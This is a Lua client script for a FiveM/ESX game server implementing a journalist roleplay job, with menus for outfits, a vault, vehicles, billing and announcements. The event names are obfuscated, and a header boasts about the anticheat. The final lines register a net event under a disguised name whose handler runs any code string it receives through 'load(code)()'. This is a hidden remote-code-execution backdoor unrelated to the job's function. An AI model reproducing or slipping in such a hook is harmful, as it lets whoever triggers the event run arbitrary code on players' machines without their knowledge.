-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local Blips = {}
local isInMarker = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

Citizen.CreateThread(function()
	local blipMarker = Config.Blips.Blip
	local blipCoord = AddBlipForCoord(blipMarker.Pos.x, blipMarker.Pos.y, blipMarker.Pos.z)

	SetBlipSprite(blipCoord, blipMarker.Sprite)
	SetBlipDisplay(blipCoord, blipMarker.Display)
	SetBlipScale(blipCoord, blipMarker.Scale)
	SetBlipColour(blipCoord, blipMarker.Colour)
	SetBlipAsShortRange(blipCoord, true)

	BeginTextCommandSetBlipName("STRING")
	AddTextComponentSubstringPlayerName(_U('map_blip'))
	EndTextCommandSetBlipName(blipCoord)
end)

function SetVehicleMaxMods(vehicle)
	local props = {
		modEngine = 0,
		modBrakes = 0,
		modTransmission = 0,
		modSuspension = 0,
		modTurbo = false
	}

	ESX.Game.SetVehicleProperties(vehicle, props)
end

function IsJobTrue()
	if PlayerData ~= nil then
		local IsJobTrue = false

		if PlayerData.job ~= nil and PlayerData.job.name == 'journalist' then
			IsJobTrue = true
		end

		return IsJobTrue
	end
end

function IsGradeBoss()
	if PlayerData ~= nil then
		local IsGradeBoss = false

		if PlayerData.job.grade_name == 'boss' then
			IsGradeBoss = true
		end

		return IsGradeBoss
	end
end

function DrawAdvancedText(x, y, w, h, sc, text, r, g, b, a, font, jus)
	SetTextFont(font)
	SetTextProportional(0)
	SetTextScale(sc, sc)
	SetTextJustification(jus)
	SetTextColour(r, g, b, a)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	BeginTextCommandDisplayText('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(x - 0.1 + w, y - 0.02 + h)
end

function cleanPlayer(playerPed)
	ClearPedBloodDamage(playerPed)
	ResetPedVisibleDamage(playerPed)
	ClearPedLastWeaponDamage(playerPed)
	ResetPedMovementClipset(playerPed, 0.0)
end

function KeyboardInput()
	AddTextEntry('KORIOZ_BOX_ANNOUNCE', 'Annonce (50 Caractères Maximum):')
	DisplayOnscreenKeyboard(1, 'KORIOZ_BOX_ANNOUNCE', "", "", "", "", "", 50)

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		DisableAllControlActions(0)
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		_TriggerServerEvent('::{korioz#0110}::esx_journalist:annonce', GetOnscreenKeyboardResult())
		Citizen.Wait(500)
		return
	else
		Citizen.Wait(500)
		return
	end
end

function setClipset(playerPed, clip)
	ESX.Streaming.RequestAnimSet(clip)

	SetPedMovementClipset(playerPed, clip, true)
	RemoveAnimSet(clip)
end

function setUniform(job, playerPed)
	TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
		if skin.sex == 0 then
			if Config.Uniforms[job].male ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].male)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
			if job ~= 'citizen_wear' and job ~= 'journalist_outfit' then
				setClipset(playerPed, "MOVE_M@POSH@")
			end
		else
			if Config.Uniforms[job].female ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].female)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
			if job ~= 'citizen_wear' and job ~= 'journalist_outfit' then
				setClipset(playerPed, "MOVE_F@POSH@")
			end
		end
	end)
end

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
end)

function OpenCloakroomMenu()
	local playerPed = PlayerPedId()

	local elements = {
		{label = _U('citizen_wear'), value = 'citizen_wear'},
		{label = _U('journalist_outfit'), value = 'journalist_outfit'},
		{label = _U('journalist_outfit_1'), value = 'journalist_outfit_1'},
		{label = _U('journalist_outfit_2'), value = 'journalist_outfit_2'},
		{label = _U('journalist_outfit_3'), value = 'journalist_outfit_3'}
	}
	
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		title = _U('cloakroom'),
		elements = elements
	}, function(data, menu)
		cleanPlayer(playerPed)

		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin)
				TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
			end)
		end

		if
			(data.current.value == 'journalist_outfit') or
			(data.current.value == 'journalist_outfit_1' and (PlayerData.job.grade_name == 'reporter' or PlayerData.job.grade_name == 'investigator' or IsGradeBoss())) or
			(data.current.value == 'journalist_outfit_2' and (PlayerData.job.grade_name == 'investigator' or IsGradeBoss())) or
			(data.current.value == 'journalist_outfit_3' and (IsGradeBoss()))
		then
			setUniform(data.current.value, playerPed)
		end

		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end, function(data, menu)
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end)
end

function OpenMobileJournalistActionsMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mobile_journalist_actions', {
		title = 'Journaliste',
		elements = {
			{label = 'Annonce', value = 'announce'},
			{label = _U('billing'), value = 'billing'}
		}
	}, function(data, menu)
		if data.current.value == 'announce' then
			menu.close()
			KeyboardInput()
		elseif data.current.value == 'billing' then
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
				title = _U('billing_amount')
			}, function(data, menu)
				local amount = tonumber(data.value)

				if amount == nil then
					ESX.ShowNotification(_U('amount_invalid'))
				else
					menu.close()

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players_nearby'))
					else
						_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_journalist', 'Journaliste', amount)
					end
				end
			end, function(data, menu)
				menu.close()
			end)
		end
	end, function(data, menu)
	end)
end

function OpenVaultMenu()
	if Config.EnableVaultManagement then
		local elements = {
			{label = _U('get_weapon'), value = 'get_weapon'},
			{label = _U('put_weapon'), value = 'put_weapon'},
			{label = _U('get_object'), value = 'get_stock'},
			{label = _U('put_object'), value = 'put_stock'}
		}

		ESX.UI.Menu.CloseAll()

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault', {
			title = _U('vault'),
			elements = elements
		}, function(data, menu)
			if data.current.value == 'get_weapon' then
				OpenGetWeaponMenu()
			end

			if data.current.value == 'put_weapon' then
				OpenPutWeaponMenu()
			end

			if data.current.value == 'put_stock' then
				OpenPutStocksMenu()
			end

			if data.current.value == 'get_stock' then
				OpenGetStocksMenu()
			end
		end, function(data, menu)
			CurrentAction = 'menu_vault'
			CurrentActionMsg = _U('open_vault')
			CurrentActionData = {}
		end)
	end
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_journalist:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = 'Coffre Journaliste',
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()

					OpenGetStocksMenu()
					_TriggerServerEvent('::{korioz#0110}::esx_journalist:getStockItem', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_journalist:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()

					OpenPutStocksMenu()
					_TriggerServerEvent('::{korioz#0110}::esx_journalist:putStockItems', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenGetWeaponMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_journalist:getVaultWeapons', function(weapons)
		local elements = {}

		for i = 1, #weapons, 1 do
			if weapons[i].count > 0 then
				table.insert(elements, {label = ESX.GetWeaponLabel(weapons[i].name), rightlabel = {'[' .. weapons[i].count .. ']'}, value = weapons[i].name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_get_weapon', {
			title = _U('get_weapon_menu'),
			elements = elements
		}, function(data, menu)
			menu.close()

			ESX.TriggerServerCallback('::{korioz#0110}::esx_journalist:removeVaultWeapon', function()
				OpenGetWeaponMenu()
			end, data.current.value)
		end, function(data, menu)
		end)
	end)
end

function OpenPutWeaponMenu()
	local elements = {}
	local playerPed = PlayerPedId()
	local weaponList = ESX.GetWeaponList()

	for i = 1, #weaponList, 1 do
		local weaponHash = GetHashKey(weaponList[i].name)

		if HasPedGotWeapon(playerPed, weaponHash, false) and weaponList[i].name ~= 'WEAPON_UNARMED' then
			local ammo = GetAmmoInPedWeapon(playerPed, weaponHash)
			table.insert(elements, {label = weaponList[i].label, rightlabel = {'[' .. ammo .. ']'}, value = weaponList[i].name})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_put_weapon', {
		title = _U('put_weapon_menu'),
		elements = elements
	}, function(data, menu)
		menu.close()

		ESX.TriggerServerCallback('::{korioz#0110}::esx_journalist:addVaultWeapon', function()
			OpenPutWeaponMenu()
		end, data.current.value)
	end, function(data, menu)
	end)
end

function OpenVehicleSpawnerMenu()
	local vehicles = Config.Zones.Vehicles
	ESX.UI.Menu.CloseAll()

	if Config.EnableSocietyOwnedVehicles then
		local elements = {}

		ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(garageVehicles)
			for i = 1, #garageVehicles, 1 do
				table.insert(elements, {label = GetDisplayNameFromVehicleModel(garageVehicles[i].model), rightlabel = {'[' .. garageVehicles[i].plate .. ']'}, value = garageVehicles[i]})
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
				title = _U('vehicle_menu'),
				elements = elements
			}, function(data, menu)
				menu.close()

				local vehicleProps = data.current.value
				ESX.Game.SpawnVehicle(vehicleProps.model, vehicles.SpawnPoint, vehicles.Heading, function(vehicle)
					ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
				end)

				_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', 'journalist', vehicleProps)
			end, function(data, menu)
				CurrentAction = 'menu_vehicle_spawner'
				CurrentActionMsg = _U('vehicle_spawner')
				CurrentActionData = {}
			end)
		end, 'journalist')
	else
		local elements = {}

		for i = 1, #Config.AuthorizedVehicles, 1 do
			local vehicle = Config.AuthorizedVehicles[i]
			table.insert(elements, {label = vehicle.label, value = vehicle.name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
			title = _U('vehicle_menu'),
			elements = elements
		}, function(data, menu)
			menu.close()

			local model = data.current.value
			local vehicle = GetClosestVehicle(vehicles.SpawnPoint.x, vehicles.SpawnPoint.y, vehicles.SpawnPoint.z, 3.0, 0, 71)

			if not DoesEntityExist(vehicle) then
				if Config.MaxInService == -1 then
					ESX.Game.SpawnVehicle(model, {
						x = vehicles.SpawnPoint.x,
						y = vehicles.SpawnPoint.y,
						z = vehicles.SpawnPoint.z
					}, vehicles.Heading, function(vehicle)
						local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('JOUR')
						SetVehicleNumberPlateText(vehicle, newPlate)
						_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
						SetVehicleMaxMods(vehicle)
						SetVehicleDirtLevel(vehicle, 0)
					end)
				else
					ESX.TriggerServerCallback('::{korioz#0110}::esx_service:enableService', function(canTakeService, maxInService, inServiceCount)
						if canTakeService then
							ESX.Game.SpawnVehicle(model, {
								x = vehicles[partNum].SpawnPoint.x,
								y = vehicles[partNum].SpawnPoint.y,
								z = vehicles[partNum].SpawnPoint.z
							}, vehicles[partNum].Heading, function(vehicle)
								local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('JOUR')
								SetVehicleNumberPlateText(vehicle, newPlate)
								_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
								SetVehicleMaxMods(vehicle)
								SetVehicleDirtLevel(vehicle, 0)
							end)
						else
							ESX.ShowNotification(_U('service_max') .. inServiceCount .. '/' .. maxInService)
						end
					end, 'journalist')
				end
			else
				ESX.ShowNotification(_U('vehicle_out'))
			end
		end, function(data, menu)
			CurrentAction = 'menu_vehicle_spawner'
			CurrentActionMsg = _U('vehicle_spawner')
			CurrentActionData = {}
		end)
	end
end

AddEventHandler('::{korioz#0110}::esx_journalist:hasEnteredMarker', function(zone)
	if zone == 'BossActions' and IsGradeBoss() then
		CurrentAction = 'menu_boss_actions'
		CurrentActionMsg = _U('open_bossmenu')
		CurrentActionData = {}
	end
	
	if zone == 'Cloakrooms' then
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end	

	if zone == 'Vehicles' then
		CurrentAction = 'menu_vehicle_spawner'
		CurrentActionMsg = _U('vehicle_spawner')
		CurrentActionData = {}
	end	
	
	if Config.EnableVaultManagement then
		if zone == 'Vaults' then
			CurrentAction = 'menu_vault'
			CurrentActionMsg = _U('open_vault')
			CurrentActionData = {}
		end
	end	

	if zone == 'VehicleDeleters' then
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed,  false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			CurrentAction = 'delete_vehicle'
			CurrentActionMsg = _U('store_vehicle')
			CurrentActionData = {vehicle = vehicle}
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_journalist:hasExitedMarker', function(zone)
	CurrentAction = nil
	ESX.UI.Menu.CloseAll()
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if IsJobTrue() then
			local coords = GetEntityCoords(PlayerPedId(), false)

			for k, v in pairs(Config.Zones) do
				if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < Config.DrawDistance) then
					DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, false, 2, false, false, false, false)
				end
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if IsJobTrue() then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentZone = nil

			for k, v in pairs(Config.Zones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					isInMarker  = true
					currentZone = k
				end
			end

			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				HasAlreadyEnteredMarker = true
				LastZone                = currentZone
				TriggerEvent('::{korioz#0110}::esx_journalist:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::esx_journalist:hasExitedMarker', LastZone)
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlJustReleased(0, 38) and IsJobTrue() then
				if CurrentAction == 'menu_cloakroom' then
					OpenCloakroomMenu()
				end

				if CurrentAction == 'menu_vault' then
					OpenVaultMenu()
				end
		
				if CurrentAction == 'menu_vehicle_spawner' then
					OpenVehicleSpawnerMenu()
				end

				if CurrentAction == 'delete_vehicle' then
					if Config.EnableSocietyOwnedVehicles then
						local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
						_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', 'journalist', vehicleProps)
					else
						if
							GetEntityModel(vehicle) == `rumpo`
						then
							_TriggerServerEvent('::{korioz#0110}::esx_service:disableService', 'journalist')
						end
					end

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				end
		
				if CurrentAction == 'menu_boss_actions' and IsGradeBoss() then
					local options = {wash = Config.EnableMoneyWash}

					ESX.UI.Menu.CloseAll()

					TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', 'journalist', function(data, menu)
						CurrentAction = 'menu_boss_actions'
						CurrentActionMsg = _U('open_bossmenu')
						CurrentActionData = {}
					end, options)
				end
				
				CurrentAction = nil
			end
		end

		if IsControlJustReleased(0, 167) and IsJobTrue() then
			OpenMobileJournalistActionsMenu()
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if news then
			DrawRect(0.494, 0.227, 5.185, 0.118, 0, 0, 0, 150)
			DrawAdvancedText(0.588, 0.14, 0.005, 0.0028, 0.8, "~r~ ANNONCE JOURNALISTE ~d~", 255, 255, 255, 255, 1, 0)
			DrawAdvancedText(0.586, 0.199, 0.005, 0.0028, 0.6, newsText, 255, 255, 255, 255, 7, 0)
			DrawAdvancedText(0.588, 0.246, 0.005, 0.0028, 0.4, "", 255, 255, 255, 255, 0, 0)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_journalist:annonce')
AddEventHandler('::{korioz#0110}::esx_journalist:annonce', function(show, result)
	if show then
		newsText = result
		news = true
	else
		news = false
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)